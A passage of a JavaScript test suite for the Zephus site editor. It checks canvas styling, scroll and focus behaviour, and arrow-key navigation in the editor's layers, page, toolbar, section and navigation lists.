          ? styles.slice(titleAt, titleEnd)
          : "";
      const hoverAt = styles.indexOf(
        ".canvas .block .zephus-postlist-title a:hover",
      );
      const hoverEnd = styles.indexOf("}", hoverAt);
      const hoverRule =
        hoverAt > titleAt && hoverEnd > hoverAt
          ? styles.slice(hoverAt, hoverEnd)
          : "";
      const published =
        schema.includes(".zephus-postlist-title a {") &&
        /color:\s*inherit/.test(
          schema.slice(
            schema.indexOf(".zephus-postlist-title a {"),
            schema.indexOf(".zephus-postlist-title a:hover"),
          ),
        ) &&
        themes.includes(
          ".zephus-postlist-title a { color: inherit; text-decoration: none; }",
        );
      record(
        "canvas post titles match the published heading color",
        anchorAt >= 0 &&
          titleAt > anchorAt &&
          /color:\s*inherit/.test(titleRule) &&
          /text-decoration:\s*none/.test(titleRule) &&
          /--zephus-accent-ink/.test(hoverRule) &&
          published,
        `titleAt=${titleAt} hover=${hoverRule.length > 0}`,
      );
    } catch (error) {
      record(
        "canvas post titles match the published heading color",
        false,
        error instanceof Error ? error.message : String(error),
      );
    }
  }

  // Feature and pricing cards share a row on the published page. Insert rails
  // used to be grid items between those cards, so the canvas stacked them.
  {
    try {
      const view = fs.readFileSync(
        path.join(ROOT, "src", "renderer", "CanvasView.tsx"),
        "utf8",
      );
      const styles = squashText(
        fs.readFileSync(
          path.join(ROOT, "src", "renderer", "styles.css"),
          "utf8",
        ),
      );
      const canvas = fs.readFileSync(
        path.join(ROOT, "src", "renderer", "editorCanvas.ts"),
        "utf8",
      );
      const slotAt = view.indexOf('class="canvas-block-slot"');
      const slot = slotAt >= 0 ? view.slice(slotAt, slotAt + 420) : "";
      const insertRuleAt = styles.lastIndexOf("> .canvas-insert {");
      const insertRule =
        insertRuleAt >= 0
          ? styles.slice(insertRuleAt, styles.indexOf("}", insertRuleAt))
          : "";
      const hoverAt = styles.indexOf(".canvas-block-slot:hover");
      const hoverEnd = styles.indexOf(".canvas .zephus-gallery img", hoverAt);
      const hoverRule =
        hoverAt >= 0
          ? styles.slice(
              hoverAt,
              hoverEnd > hoverAt ? hoverEnd : hoverAt + 2400,
            )
          : "";
      record(
        "canvas feature cards stay side by side",
        slot.includes("<InsertBlockButton") &&
          slot.includes("<BlockShell") &&
          styles.includes(
            ".section-body:has(> .canvas-block-slot > .block > .block-preview > .zephus-feature)",
          ) &&
          !styles.includes(
            ".section-body:has(> .block > .block-preview > .zephus-feature)",
          ) &&
          /position:\s*absolute/.test(insertRule) &&
          /pointer-events:\s*none/.test(insertRule) &&
          /pointer-events:\s*auto/.test(hoverRule) &&
          canvas.includes(
            ":scope > .canvas-section > .section-body > .canvas-block-slot > .block",
          ) &&
          canvas.includes(":scope > .canvas-block-slot > .block"),
        slot.includes("BlockShell") ? "slot wraps the card" : "missing",
      );
    } catch (error) {
      record(
        "canvas feature cards stay side by side",
        false,
        error instanceof Error ? error.message : String(error),
      );
    }
  }

  // A drop line inserted before a nested block throws, because the block's
  // parent is the slot. In a card row that same line would take a column.
  {
    try {
      const canvas = fs.readFileSync(
        path.join(ROOT, "src", "renderer", "editorCanvas.ts"),
        "utf8",
      );
      const styles = fs.readFileSync(
        path.join(ROOT, "src", "renderer", "styles.css"),
        "utf8",
      );
      const fnAt = canvas.indexOf("function showIndicator");
      const fn =
        fnAt >= 0
          ? canvas.slice(fnAt, canvas.indexOf("function handleDrop", fnAt))
          : "";
      const ruleAt = styles.indexOf(".canvas-block-slot > .drop-indicator");
      const rule = ruleAt >= 0 ? styles.slice(ruleAt, ruleAt + 420) : "";
      record(
        "canvas drop line stays on the block slot",
        fn.includes('closest(".canvas-block-slot")') &&
          fn.includes("canvas.contains(slot)") &&
          fn.includes("slot.append(indicator)") &&
          !fn.includes("insertBefore") &&
          /position:\s*absolute/.test(rule) &&
          /pointer-events:\s*none/.test(rule) &&
          /\.before\s*\{[^}]*top:\s*0/.test(rule) &&
          /\.after\s*\{[^}]*bottom:\s*0/.test(rule),
        fn.includes("slot.append") ? "line anchors to the slot" : "missing",
      );
    } catch (error) {
      record(
        "canvas drop line stays on the block slot",
        false,
        error instanceof Error ? error.message : String(error),
      );
    }
  }

  // The layers list selects a block that may be far down the page. The canvas
  // pane has to move to it, and a long section must not jump to its end.
  {
    try {
      const reveal = compileRendererHelper("src/renderer/revealSelection.ts");
      const view = fs.readFileSync(
        path.join(ROOT, "src", "renderer", "CanvasView.tsx"),
        "utf8",
      );
      const rect = (top, bottom) => ({
        top,
        bottom,
        left: 0,
        right: 100,
        width: 100,
        height: bottom - top,
        x: 0,
        y: top,
        toJSON() {
          return {};
        },
      });
      const scroller = dom.window.document.createElement("div");
      const target = dom.window.document.createElement("div");
      scroller.getBoundingClientRect = () => rect(0, 200);
      const scrollBy = (top, bottom, start) => {
        target.getBoundingClientRect = () => rect(top, bottom);
        scroller.scrollTop = start;
        reveal.scrollToReveal(scroller, target);
        return scroller.scrollTop;
      };
      const wrap = dom.window.document.createElement("div");
      wrap.className = "canvas-wrap";
      const canvas = dom.window.document.createElement("div");
      canvas.id = "canvas";
      const block = dom.window.document.createElement("div");
      block.className = "block selected";
      canvas.append(block);
      wrap.append(canvas);
      dom.window.document.body.append(wrap);
      wrap.getBoundingClientRect = () => rect(0, 100);
      block.getBoundingClientRect = () => rect(300, 340);
      wrap.scrollTop = 0;
      reveal.revealCanvasSelection(dom.window.document);
      const broughtIntoView = wrap.scrollTop === 288;
      block.className = "block";
      wrap.scrollTop = 15;
      reveal.revealCanvasSelection(dom.window.document);
      const staysWithoutSelection = wrap.scrollTop === 15;
      wrap.remove();
      record(
        "canvas follows the selected block",
        scrollBy(480, 520, 0) === 468 &&
          scrollBy(40, 80, 10) === 10 &&
          scrollBy(20, 2000, 10) === 10 &&
          scrollBy(-30, 10, 100) === 58 &&
          scrollBy(170, 210, 0) === 22 &&
          broughtIntoView &&
          staysWithoutSelection &&
          view.includes("revealCanvasSelection()"),
        broughtIntoView ? "selection scrolls into the pane" : "missing",
      );
    } catch (error) {
      record(
        "canvas follows the selected block",
        false,
        error instanceof Error ? error.message : String(error),
      );
    }
  }

  // Opening another page used to leave the canvas scrolled to the previous
  // page, and the page list did not move to the page that opened.
  {
    try {
      const reveal = compileRendererHelper("src/renderer/revealSelection.ts");
      const loader = fs.readFileSync(
        path.join(ROOT, "src", "renderer", "editorPageLoad.ts"),
        "utf8",
      );
      const rect = (top, bottom) => ({
        top,
        bottom,
        left: 0,
        right: 80,
        width: 80,
        height: bottom - top,
        x: 0,
        y: top,
        toJSON() {
          return {};
        },
      });
      const doc = dom.window.document;
      const wrap = doc.createElement("div");
      wrap.className = "canvas-wrap";
      wrap.scrollTop = 240;
      wrap.scrollLeft = 18;
      const inspect = doc.createElement("div");
      inspect.id = "workspace-right-inspect";
      inspect.scrollTop = 90;
      const pages = doc.createElement("div");
      pages.className = "workspace-tab-panel";
      const list = doc.createElement("ul");
      list.id = "page-list";
      const item = doc.createElement("li");
      item.className = "page-item active";
      list.append(item);
      pages.append(list);
      doc.body.append(wrap, inspect, pages);
      pages.getBoundingClientRect = () => rect(0, 120);
      item.getBoundingClientRect = () => rect(400, 440);
      reveal.resetPageSwitchScroll(doc);
      const canvasReset = wrap.scrollTop === 0 && wrap.scrollLeft === 0;
      const inspectorReset = inspect.scrollTop === 0;
      const pageShown = pages.scrollTop === 392;
      wrap.remove();
      inspect.remove();
      pages.remove();
      record(
        "opening a page starts at the top",
        canvasReset &&
          inspectorReset &&
          pageShown &&
          loader.includes("if (sourcePage !== page) resetPageSwitchScroll();"),
        canvasReset ? "page switch resets the pane" : "missing",
      );
    } catch (error) {
      record(
        "opening a page starts at the top",
        false,
        error instanceof Error ? error.message : String(error),
      );
    }
  }

  // The inspector keeps its scroll position when the form is rebuilt for the
  // same block. A different block starts at the top of its own fields.
  {
    try {
      const reveal = compileRendererHelper("src/renderer/revealSelection.ts");
      const canvas = fs.readFileSync(
        path.join(ROOT, "src", "renderer", "editorCanvas.ts"),
        "utf8",
      );
      const doc = dom.window.document;
      const inspect = doc.createElement("div");
      inspect.id = "workspace-right-inspect";
      inspect.scrollTop = 640;
      inspect.scrollLeft = 12;
      doc.body.append(inspect);
      reveal.resetInspectorScroll(doc);
      const cleared = inspect.scrollTop === 0 && inspect.scrollLeft === 0;
      inspect.remove();
      const propsAt = canvas.indexOf("function renderProperties");
      const props = propsAt >= 0 ? canvas.slice(propsAt, propsAt + 2400) : "";
      record(
        "inspector starts at the top for a new block",
        cleared &&
          props.includes(
            "const selectionChanged = selectionKey !== lastInspectorSelectionKey;",
          ) &&
          props.includes("if (selectionChanged) resetInspectorScroll();"),
        cleared ? "new selection resets the inspector" : "missing",
      );
    } catch (error) {
      record(
        "inspector starts at the top for a new block",
        false,
        error instanceof Error ? error.message : String(error),
      );
    }
  }

  // Selecting a block on the canvas marks its row in the page-structure list.
  // That row has to scroll into view, and a later repaint of the same row
  // must not pull the list back.
  {
    try {
      const reveal = compileRendererHelper("src/renderer/revealSelection.ts");
      const layers = fs.readFileSync(
        path.join(ROOT, "src", "renderer", "Layers.tsx"),
        "utf8",
      );
      const engine = fs.readFileSync(
        path.join(ROOT, "src", "renderer", "zephusEngine.ts"),
        "utf8",
      );
      const workspace = fs.readFileSync(
        path.join(ROOT, "src", "renderer", "editorWorkspace.ts"),
        "utf8",
      );
      const rect = (top, bottom) => ({
        top,
        bottom,
        left: 0,
        right: 80,
        width: 80,
        height: bottom - top,
        x: 0,
        y: top,
        toJSON() {
          return {};
        },
      });
      const doc = dom.window.document;
      const panel = doc.createElement("div");
      panel.className = "workspace-tab-panel";
      const list = doc.createElement("ul");
      list.id = "layers-list";
      const button = doc.createElement("button");
      button.className = "layer-button";
      button.dataset["layerId"] = "block-a";
      button.setAttribute("aria-current", "true");
      list.append(button);
      panel.append(list);
      doc.body.append(panel);
      panel.getBoundingClientRect = () => rect(0, 100);
      button.getBoundingClientRect = () => rect(300, 330);
      reveal.revealActiveLayer(doc);
      const first = panel.scrollTop === 292;
      panel.scrollTop = 0;
      reveal.revealActiveLayer(doc);
      const held = panel.scrollTop === 0;
      button.dataset["layerId"] = "block-b";
      reveal.revealActiveLayer(doc);
      const next = panel.scrollTop === 292;
      panel.hidden = true;
      panel.scrollTop = 4;
      button.dataset["layerId"] = "block-c";
      reveal.revealActiveLayer(doc);
      const hiddenHolds = panel.scrollTop === 4;
      panel.hidden = false;
      panel.scrollTop = 0;
      reveal.revealActiveLayer(doc);
      const shownAfterOpen = panel.scrollTop === 292;
      panel.remove();
      const renderAt = engine.indexOf("function renderLayers");
      const render =
        renderAt >= 0 ? engine.slice(renderAt, renderAt + 700) : "";
      record(
        "page structure list follows the selected block",
        first &&
          held &&
          next &&
          hiddenHolds &&
          shownAfterOpen &&
          layers.includes("data-layer-id={section.id}") &&
          layers.includes("data-layer-id={child.id}") &&
          render.includes("revealActiveLayer()") &&
          workspace.includes('tabId === "layers"') &&
          workspace.includes("revealActiveLayer()"),
        first ? "active row scrolls into the list" : "missing",
      );
    } catch (error) {
      record(
        "page structure list follows the selected block",
        false,
        error instanceof Error ? error.message : String(error),
      );
    }
  }

  // Page structure is a long list of rows. Arrow keys have to move the
  // selection, and only the active row stays in the tab order.
  {
    try {
      const kb = compileRendererHelper("src/renderer/layerKeyboard.ts");
      const doc = dom.window.document;
      const panel = doc.createElement("div");
      panel.className = "workspace-tab-panel";
      const list = doc.createElement("ul");
      list.id = "layers-list";
      const make = (id) => {
        const button = doc.createElement("button");
        button.type = "button";
        button.className = "layer-button";
        button.dataset.layerId = id;
        button.tabIndex = -1;
        list.append(button);
        return button;
      };
      const firstButton = make("block-a");
      const quoted = make('quo"te');
      const lastButton = make("block-c");
      firstButton.tabIndex = 0;
      panel.append(list);
      doc.body.append(panel);
      panel.scrollTop = 40;
      const buttons = [firstButton, quoted, lastButton];
      const down = kb.layerMoveTarget(buttons, firstButton, "ArrowDown");
      const up = kb.layerMoveTarget(buttons, lastButton, "ArrowUp");
      const stay = kb.layerMoveTarget(buttons, lastButton, "ArrowDown");
      const home = kb.layerMoveTarget(buttons, lastButton, "Home");
      const end = kb.layerMoveTarget(buttons, firstButton, "End");
      const ignore = kb.layerMoveTarget(buttons, firstButton, "Enter");
      let clicked = "";
      quoted.addEventListener("click", () => {
        clicked = quoted.dataset.layerId;
        quoted.tabIndex = 0;
        firstButton.tabIndex = -1;
      });
      const event = {
        key: "ArrowDown",
        target: firstButton,
        currentTarget: firstButton,
        preventDefault() {
          this.defaultPrevented = true;
        },
        defaultPrevented: false,
      };
      kb.onLayerKeyDown(event);
      const focusedQuote = doc.activeElement === quoted;
      const scrollHeld = panel.scrollTop === 40;
      let boundaryClicks = 0;
      lastButton.addEventListener("click", () => {
        boundaryClicks += 1;
      });
      const boundary = {
        key: "ArrowDown",
        target: lastButton,
        currentTarget: lastButton,
        preventDefault() {
          this.defaultPrevented = true;
        },
        defaultPrevented: false,
      };
      kb.onLayerKeyDown(boundary);
      const nested = {
        key: "ArrowDown",
        target: doc.createElement("span"),
        currentTarget: firstButton,
        preventDefault() {
          this.defaultPrevented = true;
        },
        defaultPrevented: false,
      };
      kb.onLayerKeyDown(nested);
      const layers = fs.readFileSync(
        path.join(ROOT, "src", "renderer", "Layers.tsx"),
        "utf8",
      );
      const keydowns = layers.split("onKeyDown={onLayerKeyDown}").length - 1;
      record(
        "page structure rows move with the arrow keys",
        down === quoted &&
          up === quoted &&
          stay === null &&
          home === firstButton &&
          end === lastButton &&
          ignore === null &&
          event.defaultPrevented === true &&
          clicked === 'quo"te' &&
          focusedQuote &&
          scrollHeld &&
          boundary.defaultPrevented === true &&
          boundaryClicks === 0 &&
          nested.defaultPrevented === false &&
          kb.layerTabStop(false, false) === -1 &&
          kb.layerTabStop(true, false) === 0 &&
          kb.layerTabStop(false, true) === 0 &&
          keydowns === 2 &&
          layers.includes("index() === 0 && !anyLayerActive()") &&
          layers.includes("layerTabStop(child.active, false)") &&
          layers.includes('from "./layerKeyboard"'),
        `down=${down === quoted} up=${up === quoted} stay=${stay === null} home=${home === firstButton} end=${end === lastButton} ignore=${ignore === null} prevented=${event.defaultPrevented} clicked=${clicked} focused=${focusedQuote} scroll=${panel.scrollTop} boundary=${boundary.defaultPrevented}/${boundaryClicks} nested=${nested.defaultPrevented} tabs=${keydowns}`,
      );
      panel.remove();
    } catch (error) {
      record(
        "page structure rows move with the arrow keys",
        false,
        error instanceof Error ? error.message : String(error),
      );
    }
  }

  // Arrow keys in the page list move between pages and their actions.
  // They must not open a page; Enter still does that.
  {
    try {
      const pages = compileRendererHelper("src/renderer/pageKeyboard.ts");
      const doc = dom.window.document;
      const panel = doc.createElement("div");
      panel.className = "workspace-tab-panel";
      const list = doc.createElement("ul");
      list.id = "page-list";
      const makeRow = (name, options = {}) => {
        const row = doc.createElement("li");
        row.className = "page-item";
        const main = doc.createElement("button");
        main.type = "button";
        main.className = "page-main";
        main.textContent = name;
        const nav = doc.createElement("button");
        nav.type = "button";
        nav.className = "mini-btn page-nav-toggle";
        const manage = doc.createElement("button");
        manage.type = "button";
        manage.className = "mini-btn page-manage-button";
        if (options.mainDisabled) main.disabled = true;
        if (options.navDisabled) nav.disabled = true;
        row.append(main, nav, manage);
        list.append(row);
        return { row, main, nav, manage };
      };
      const first = makeRow("Home");
      const middle = makeRow("About", { navDisabled: true });
      const skipped = makeRow("Draft", { mainDisabled: true });
      const last = makeRow("Contact");
      panel.append(list);
      doc.body.append(panel);
      const rows = [first.row, middle.row, skipped.row, last.row];
      const rect = (top, bottom) => ({
        top,
        bottom,
        left: 0,
        right: 80,
        width: 80,
        height: bottom - top,
        x: 0,
        y: top,
        toJSON() {
          return {};
        },
      });
      panel.getBoundingClientRect = () => rect(0, 100);
      last.main.getBoundingClientRect = () => rect(300, 330);
      let opens = 0;
      last.main.addEventListener("click", () => {
        opens += 1;
      });
      const down = pages.pageMoveTarget(rows, first.main, "ArrowDown");
      const skipDisabled = pages.pageMoveTarget(rows, middle.main, "ArrowDown");
      const rightSkips = pages.pageMoveTarget(rows, middle.main, "ArrowRight");
      const leftEdge = pages.pageMoveTarget(rows, first.main, "ArrowLeft");
      const home = pages.pageMoveTarget(rows, last.main, "Home");
      const end = pages.pageMoveTarget(rows, first.nav, "End");
      const ignore = pages.pageMoveTarget(rows, first.main, "Enter");
      const move = {
        key: "ArrowDown",
        target: middle.main,
        currentTarget: middle.main,
        preventDefault() {
          this.defaultPrevented = true;
        },
        defaultPrevented: false,
      };
      pages.onPageKeyDown(move);
      const focusedLast = doc.activeElement === last.main;
      const scrolled = panel.scrollTop === 292;
      const stops = Array.from(list.querySelectorAll("button")).filter(
        (button) => button.tabIndex === 0,
      );
      const oneStop = stops.length === 1 && stops[0] === last.main;
      const kept = pages.pageStop(
        [{ page: "home", active: true }, { page: "about" }],
        "about",
        "nav",
      );
      const blocked = pages.pageStop(
        [
          { page: "home", active: true },
          { page: "about", interactionDisabled: true },
        ],
        "about",
        "manage",
      );
      const loading = pages.pageStop(
        [{ page: "home", active: true, loading: true }, { page: "about" }],
        "home",
        "main",
      );
      const none = pages.pageStop(
        [{ page: "home", loading: true }],
        null,
        null,
      );
      const boundary = {
        key: "ArrowDown",
        target: last.main,
        currentTarget: last.main,
        preventDefault() {
          this.defaultPrevented = true;
        },
        defaultPrevented: false,
      };
      pages.onPageKeyDown(boundary);
      const nested = {
        key: "ArrowDown",
        target: doc.createElement("span"),
        currentTarget: first.main,
        preventDefault() {
          this.defaultPrevented = true;
        },
        defaultPrevented: false,
      };
      pages.onPageKeyDown(nested);
      const source = fs.readFileSync(
        path.join(ROOT, "src", "renderer", "PageList.tsx"),
        "utf8",
      );
      const help = squashText(
        fs.readFileSync(
          path.join(ROOT, "src", "renderer", "HelpModal.tsx"),
          "utf8",
        ),
      );
      const keyboard = fs.readFileSync(
        path.join(ROOT, "src", "renderer", "pageKeyboard.ts"),
        "utf8",
      );
      const handlers = source.split("onKeyDown={onPageKeyDown}").length - 1;
      record(
        "page list moves with the arrow keys without opening a page",
        down === middle.main &&
          skipDisabled === last.main &&
          rightSkips === middle.manage &&
          leftEdge === null &&
          home === first.main &&
          end === last.nav &&
          ignore === null &&
          move.defaultPrevented === true &&
          focusedLast &&
          scrolled &&
          oneStop &&
          kept &&
          kept.page === "about" &&
          kept.kind === "nav" &&
          blocked &&
          blocked.page === "home" &&
          blocked.kind === "main" &&
          loading &&
          loading.page === "about" &&
          loading.kind === "main" &&
          none === null &&
          opens === 0 &&
          boundary.defaultPrevented === true &&
          nested.defaultPrevented === false &&
          handlers === 3 &&
          source.includes("onPageKeyDown as movePageFocus") &&
          source.includes("pageStop(") &&
          source.includes("pageTabStop(") &&
          source.includes('data-page-action="main"') &&
          source.includes('data-page-action="nav"') &&
          source.includes('data-page-action="manage"') &&
          !keyboard.includes(".click(") &&
          help.includes(
            "Move between page-structure rows when that list is focused",
          ) &&
          help.includes(
            "Move between pages and page actions when the page list is focused",
          ),
        `down=${down === middle.main} skip=${skipDisabled === last.main} right=${rightSkips === middle.manage} left=${leftEdge === null} home=${home === first.main} end=${end === last.nav} focused=${focusedLast} oneStop=${oneStop} scroll=${panel.scrollTop} opens=${opens} boundary=${boundary.defaultPrevented} nested=${nested.defaultPrevented} handlers=${handlers}`,
      );
      panel.remove();
    } catch (error) {
      record(
        "page list moves with the arrow keys without opening a page",
        false,
        error instanceof Error ? error.message : String(error),
      );
    }
  }

  // Block and section actions are toolbars. Arrow keys move between the
  // actions, and only one action in each toolbar is a tab stop.
  {
    try {
      const bars = compileRendererHelper("src/renderer/toolbarKeyboard.ts");
      const doc = dom.window.document;
      const wrap = doc.createElement("div");
      wrap.className = "canvas-wrap";
      const toolbar = doc.createElement("div");
      toolbar.setAttribute("role", "toolbar");
      const make = (label, disabled) => {
        const button = doc.createElement("button");
        button.type = "button";
        button.className = "canvas-action-button";
        button.textContent = label;
        button.tabIndex = -1;
        if (disabled) button.disabled = true;
        toolbar.append(button);
        return button;
      };
      const first = make("Move up", false);
      const disabled = make("Move down", true);
      const last = make("Delete", false);
      first.tabIndex = 0;
      wrap.append(toolbar);
      doc.body.append(wrap);
      const enabled = bars.toolbarButtons(toolbar);
      const right = bars.toolbarMoveTarget(enabled, first, "ArrowRight");
      const down = bars.toolbarMoveTarget(enabled, first, "ArrowDown");
      const leftEdge = bars.toolbarMoveTarget(enabled, first, "ArrowLeft");
      const home = bars.toolbarMoveTarget(enabled, last, "Home");
      const end = bars.toolbarMoveTarget(enabled, first, "End");
      const ignore = bars.toolbarMoveTarget(enabled, first, "Enter");
      const rect = (top, bottom) => ({
        top,
        bottom,
        left: 0,
        right: 40,
        width: 40,
        height: bottom - top,
        x: 0,
        y: top,
        toJSON() {
          return {};
        },
      });
      wrap.getBoundingClientRect = () => rect(0, 100);
      last.getBoundingClientRect = () => rect(300, 330);
      let runs = 0;
      last.addEventListener("click", () => {
        runs += 1;
      });
      const move = {
        key: "ArrowRight",
        target: first,
        currentTarget: first,
        preventDefault() {
          this.defaultPrevented = true;
        },
        defaultPrevented: false,
      };
      bars.onToolbarKeyDown(move);
      const focused = doc.activeElement === last;
      const scrolled = wrap.scrollTop === 288;
      const stops = [first.tabIndex, disabled.tabIndex, last.tabIndex];
      const boundary = {
        key: "ArrowRight",
        target: last,
        currentTarget: last,
        preventDefault() {
          this.defaultPrevented = true;
        },
        defaultPrevented: false,
      };
      bars.onToolbarKeyDown(boundary);
      const nested = {
        key: "ArrowRight",
        target: doc.createElement("span"),
        currentTarget: first,
        preventDefault() {
          this.defaultPrevented = true;
        },
        defaultPrevented: false,
      };
      bars.onToolbarKeyDown(nested);
      const view = fs.readFileSync(
        path.join(ROOT, "src", "renderer", "CanvasView.tsx"),
        "utf8",
      );
      const help = squashText(
        fs.readFileSync(
          path.join(ROOT, "src", "renderer", "HelpModal.tsx"),
          "utf8",
        ),
      );
      const keyboard = fs.readFileSync(
        path.join(ROOT, "src", "renderer", "toolbarKeyboard.ts"),
        "utf8",
      );
      const declaredStops = view
        .split("\n")
        .filter((line) => line.trim() === "tabStop").length;
      record(
        "canvas toolbars move with the arrow keys without running an action",
        enabled.length === 2 &&
          !enabled.includes(disabled) &&
          right === last &&
          down === last &&
          leftEdge === null &&
          home === first &&
          end === last &&
          ignore === null &&
          move.defaultPrevented === true &&
          focused &&
          scrolled &&
          stops[0] === -1 &&
          stops[1] === -1 &&
          stops[2] === 0 &&
          runs === 0 &&
          boundary.defaultPrevented === true &&
          nested.defaultPrevented === false &&
          declaredStops === 2 &&
          view.includes("tabIndex={props.tabStop ? 0 : -1}") &&
          view.includes("onKeyDown={onToolbarKeyDown}") &&
          !keyboard.includes(".click(") &&
          help.includes(
            "Move between actions in a block or section toolbar when that toolbar is focused",
          ),
        `right=${right === last} down=${down === last} left=${leftEdge === null} home=${home === first} end=${end === last} focused=${focused} scroll=${wrap.scrollTop} tabs=${stops.join(",")} runs=${runs} boundary=${boundary.defaultPrevented} nested=${nested.defaultPrevented} stops=${declaredStops}`,
      );
      wrap.remove();
    } catch (error) {
      record(
        "canvas toolbars move with the arrow keys without running an action",
        false,
        error instanceof Error ? error.message : String(error),
      );
    }
  }

  // A canvas re-render removes the focused block. Focus has to land on the
  // selection again, and a selected section must not jump the scroll position.
  {
    try {
      const reveal = compileRendererHelper("src/renderer/revealSelection.ts");
      const doc = dom.window.document;
      const outer = doc.createElement("div");
      const wrap = doc.createElement("div");
      wrap.className = "canvas-wrap";
      const canvas = doc.createElement("div");
      canvas.id = "canvas";
      const section = doc.createElement("div");
      section.className = "canvas-section selected";
      const body = doc.createElement("div");
      body.className = "section-body";
      body.tabIndex = 0;
      const block = doc.createElement("div");
      block.className = "block";
      block.tabIndex = 0;
      section.append(body, block);
      canvas.append(section);
      wrap.append(canvas);
      outer.append(wrap);
      doc.body.append(outer);
      outer.scrollTop = 5;
      wrap.scrollTop = 9;
      reveal.focusCanvasSelection(doc);
      const sectionFocused = doc.activeElement === body;
      const sectionScrollHeld = wrap.scrollTop === 9;
      const outerHeld = outer.scrollTop === 5;
      section.classList.remove("selected");
      block.classList.add("selected");
      const rect = (top, bottom) => ({
        top,
        bottom,
        left: 0,
        right: 80,
        width: 80,
        height: bottom - top,
        x: 0,
        y: top,
        toJSON() {
          return {};
        },
      });
      wrap.getBoundingClientRect = () => rect(0, 100);
      block.getBoundingClientRect = () => rect(300, 340);
      wrap.scrollTop = 0;
      reveal.focusCanvasSelection(doc);
      const blockFocused = doc.activeElement === block;
      const blockScrolled = wrap.scrollTop === 288;
      block.classList.remove("selected");
      const sink = doc.createElement("button");
      sink.type = "button";
      outer.append(sink);
      sink.focus();
      reveal.focusCanvasSelection(doc);
      const cleared = doc.activeElement === sink;
      const source = fs.readFileSync(
        path.join(ROOT, "src", "renderer", "editorCanvas.ts"),
        "utf8",
      );
      const help = squashText(
        fs.readFileSync(
          path.join(ROOT, "src", "renderer", "HelpModal.tsx"),
          "utf8",
        ),
      );
      record(
        "canvas keeps focus on the selection after a block is removed",
        sectionFocused &&
          sectionScrollHeld &&
          outerHeld &&
          blockFocused &&
          blockScrolled &&
          outer.scrollTop === 5 &&
          cleared &&
          source.includes("const previousInCanvas =") &&
          source.includes("canvas.contains(previous)") &&
          source.includes("if (focusLost) focusCanvasSelection();") &&
          help.includes(
            "Deleting or moving a block keeps keyboard focus on the canvas selection.",
          ),
        `section=${sectionFocused} sectionScroll=${wrap.scrollTop} outer=${outer.scrollTop} block=${blockFocused} scrolled=${blockScrolled} cleared=${cleared}`,
      );
      outer.remove();
    } catch (error) {
      record(
        "canvas keeps focus on the selection after a block is removed",
        false,
        error instanceof Error ? error.message : String(error),
      );
    }
  }

  // A focused section has to move into its blocks. Down enters the first
  // block; an empty section moves on to the next one.
  {
    try {
      const moves = compileRendererHelper("src/renderer/sectionKeyboard.ts");
      const page = [{ blockCount: 2 }, { blockCount: 0 }, { blockCount: 1 }];
      const down = moves.sectionMoveTarget(page, 0, "ArrowDown");
      const intoEmpty = moves.sectionMoveTarget(page, 1, "ArrowDown");
      const up = moves.sectionMoveTarget(page, 2, "ArrowUp");
      const upEdge = moves.sectionMoveTarget(page, 0, "ArrowUp");
      const home = moves.sectionMoveTarget(page, 2, "Home");
      const end = moves.sectionMoveTarget(page, 0, "End");
      const ignore = moves.sectionMoveTarget(page, 0, "Enter");
      const emptyPage = [{ blockCount: 0 }, { blockCount: 0 }];
      const emptyDown = moves.sectionMoveTarget(emptyPage, 0, "ArrowDown");
      const emptyEnd = moves.sectionMoveTarget(emptyPage, 0, "End");
      const same = (left, right) =>
        !!left &&
        !!right &&
        left.kind === right.kind &&
        left.index === right.index;
      const canvas = fs.readFileSync(
        path.join(ROOT, "src", "renderer", "CanvasView.tsx"),
        "utf8",
      );
      const engine = fs.readFileSync(
        path.join(ROOT, "src", "renderer", "editorCanvas.ts"),
        "utf8",
      );
      const help = squashText(
        fs.readFileSync(
          path.join(ROOT, "src", "renderer", "HelpModal.tsx"),
          "utf8",
        ),
      );
      record(
        "a focused section moves into its blocks with the arrow keys",
        same(down, { kind: "block", index: 0 }) &&
          same(intoEmpty, { kind: "block", index: 2 }) &&
          same(up, { kind: "block", index: 1 }) &&
          upEdge === null &&
          same(home, { kind: "block", index: 0 }) &&
          same(end, { kind: "block", index: 2 }) &&
          ignore === null &&
          same(emptyDown, { kind: "section", index: 1 }) &&
          same(emptyEnd, { kind: "section", index: 1 }) &&
          moves.isSectionMoveKey("ArrowDown") === true &&
          moves.isSectionMoveKey("Enter") === false &&
          canvas.includes(
            "onSectionKeyDown(event, sectionNode(props.entry))",
          ) &&
          engine.includes("sectionMoveTarget(") &&
          engine.includes(
            'if (target.kind === "block") selectBlockAt(target.index);',
          ) &&
          engine.includes("selectSectionAt(target.index);") &&
          help.includes(
            "Move from a focused section into its blocks or the next section",
          ),
        `down=${down && down.kind}:${down && down.index} empty=${intoEmpty && intoEmpty.kind}:${intoEmpty && intoEmpty.index} up=${up && up.kind}:${up && up.index} edge=${upEdge} home=${home && home.index} end=${end && end.index}`,
      );
    } catch (error) {
      record(
        "a focused section moves into its blocks with the arrow keys",
        false,
        error instanceof Error ? error.message : String(error),
      );
    }
  }

  // The navigation list sits under the page list. Arrow keys move between
  // entries and skip custom links. They must not open a page.
  {
    try {
      const nav = compileRendererHelper("src/renderer/navKeyboard.ts");
      const doc = dom.window.document;
      const panel = doc.createElement("div");
      panel.className = "workspace-tab-panel";
      const list = doc.createElement("ul");
      list.id = "nav-list";
      const make = (label, disabled) => {
        const button = doc.createElement("button");
        button.type = "button";
        button.className = "nav-entry";
        button.textContent = label;
        if (disabled) button.disabled = true;
        list.append(button);
        return button;
      };
      const home = make("Home", false);
      const custom = make("Custom", true);
      const about = make("About", false);
      panel.append(list);
      doc.body.append(panel);
      const buttons = [home, custom, about];
      const down = nav.navMoveTarget(buttons, home, "ArrowDown");
      const up = nav.navMoveTarget(buttons, about, "ArrowUp");
      const upEdge = nav.navMoveTarget(buttons, home, "ArrowUp");
      const end = nav.navMoveTarget(buttons, home, "End");
      const toStart = nav.navMoveTarget(buttons, about, "Home");
      const ignore = nav.navMoveTarget(buttons, home, "Enter");
      const rect = (top, bottom) => ({
        top,
        bottom,
        left: 0,
        right: 80,
        width: 80,
        height: bottom - top,
        x: 0,
        y: top,
        toJSON() {
          return {};
        },
      });
      panel.getBoundingClientRect = () => rect(0, 100);
      about.getBoundingClientRect = () => rect(300, 330);
      let opens = 0;
      about.addEventListener("click", () => {
        opens += 1;
      });
      const move = {
        key: "ArrowDown",
        target: home,
        currentTarget: home,
        preventDefault() {
          this.defaultPrevented = true;
        },
        defaultPrevented: false,
      };
      nav.onNavKeyDown(move);
      const focused = doc.activeElement === about;
      const scrolled = panel.scrollTop === 292;
      const boundary = {
